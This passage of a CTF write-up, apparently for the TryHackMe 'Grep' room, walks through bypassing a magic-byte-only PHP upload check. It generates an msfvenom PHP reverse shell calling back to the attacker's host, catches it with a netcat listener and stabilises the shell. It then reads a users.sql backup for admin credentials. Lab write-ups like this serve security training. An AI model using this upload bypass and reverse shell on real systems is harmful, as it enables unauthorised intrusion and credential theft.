+</span></span><span style="display:flex;"><span>    <span style="color:#76a9f9">echo</span> <span style="color:#aa89ea">json_encode</span><span style="color:#abb2bf">([</span><span style="color:#98c379">&#39;error&#39;</span> <span style="color:#54b1c7">=&gt;</span> <span style="color:#98c379">&#39;Unsupported request method.&#39;</span><span style="color:#abb2bf">]);</span>
+</span></span><span style="display:flex;"><span><span style="color:#abb2bf">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#8a93a5;font-style:italic">?&gt;</span>
+</span></span></code></pre></div><p>At first glance it seems like the code is checking both the file extension AND the magic bytes. However, it does, in fact only check to see if the magic bytes of the file being uploaded are allowed. <code>$allowedExtensions</code> is defined but never used! This means we should be able to upload the file with a <code>.php</code> extension, only modifying the magic bytes.</p>
+<ol>
+<li>Creaft the reverse shell using <em><strong>msfvenom</strong></em> with the following command:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p php/reverse_php <span style="color:#dcaeea">LHOST</span><span style="color:#54b1c7">=</span>&lt;YOUR IP HERE&gt; <span style="color:#dcaeea">LPORT</span><span style="color:#54b1c7">=</span><span style="color:#d19a66">4444</span> -o revshell.php
+</span></span></code></pre></div><ol start="2">
+<li>Add 4 A&rsquo;s (or any character really) to the beginning of the file</li>
+<li>Edit the file with <em><strong>hexeditor</strong></em> and change the values of the 4 first hexadecimal values to <em>&ldquo;FF D8 FF E0&rdquo;</em> (or to any other of the allowed values)</li>
+</ol>
+<p>Now let&rsquo;s try our new file on the upload page. In our <em><strong>ffuf</strong></em> scan we found a file called <code>upload.php</code> and the upload page is accessible to us at <code>https://grep.thm/public/html/upload.php</code>. Let&rsquo;s see what happens!</p>
+<p>Ah, yes! We get a beautiful <code>{&quot;message&quot;:&quot;File uploaded successfully.&quot;}</code> message in our browser. Now we just need to navigate over to <code>https://grep.thm/api/uploads/</code> and activate the file from there.</p>
+<p>Set up a listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lvnp <span style="color:#d19a66">4444</span>
+</span></span></code></pre></div><p>There is our reverse shell!</p>
+<p>Before doing anything else, let&rsquo;s stabilise this netcat shell.</p>
+<p>Once you have the reverse shell, do the following:</p>
+<ol>
+<li>Run:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#98c379">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><ol start="2">
+<li>Then:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e5c07b">export</span> <span style="color:#dcaeea">TERM</span><span style="color:#54b1c7">=</span>xterm
+</span></span></code></pre></div><ol start="3">
+<li>Then background the netcat shell by hitting <strong>CTRL+Z</strong>.</li>
+<li>Then turn off your own terminal echo and foreground the netcat shell with:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>stty raw -echo<span style="color:#abb2bf">;</span> <span style="color:#e5c07b">fg</span>
+</span></span></code></pre></div><p>Now let&rsquo;s find that admin email!</p>
+<p>Looking through the contents of the <code>/var/www</code> directory, there sure are many interesting files we cannot access as <code>www-data</code>, but one that we can access is <code>/var/www/backup/users.sql</code>.</p>
+<p>Running <code>cat users.sql</code> reveals the admin&rsquo;s email address.</p>
+<h3 id="a-admingrepthm">A: <em>admin@***.grep.thm</em><a hidden class="anchor" aria-hidden="true" href="#a-admingrepthm">#</a></h3>
+<h2 id="q4-what-is-the-host-name-of-the-web-application-that-allows-a-user-to-check-an-email-for-a-possible-password-leak">Q4: What is the host name of the web application that allows a user to check an email for a possible password leak?<a hidden class="anchor" aria-hidden="true" href="#q4-what-is-the-host-name-of-the-web-application-that-allows-a-user-to-check-an-email-for-a-possible-password-leak">#</a></h2>
+<p>This one we got a while back when looking at the certificates.</p>
+<h3 id="a-grepthm">A: <em>***.grep.thm</em><a hidden class="anchor" aria-hidden="true" href="#a-grepthm">#</a></h3>
+<h2 id="q5-what-is-the-password-of-the-admin-user">Q5: What is the password of the &ldquo;admin&rdquo; user?<a hidden class="anchor" aria-hidden="true" href="#q5-what-is-the-password-of-the-admin-user">#</a></h2>
+<p>Now, we could go ahead and try to brute force the password hash found in the <code>users.sql</code> file or try to put the email into the form over at <code>https://leadchecker.grep.thm:51337</code> and see what we get.</p>
+<p>Going with option two sure enough gives us the password:</p>
+<p><img src="/pics/ctf-thm-grep/13.webp" alt="13"></p>
+<h3 id="a-admin_">A: <em>admin_***!</em><a hidden class="anchor" aria-hidden="true" href="#a-admin_">#</a></h3>
+<hr>
+<p>Thank you for reading my writeup of this CTF challenge! This one had me scratching my head at times but it was fun. I learned a lot once again.</p>
+<p>Have a nice day! :)</p>
+
+
+</article>
+<footer class="post-footer">
+    <span class="post-tags">
+        
+            <a href="http://localhost:1313/tags/ctf/">
+                 #ctf</a>&nbsp;
+        
+            <a href="http://localhost:1313/tags/writeup/">
+                 #writeup</a>&nbsp;
+        
+    </span>
+
+
+</footer>
+
+            </div>
+        </main>
+    </body>
+</html>
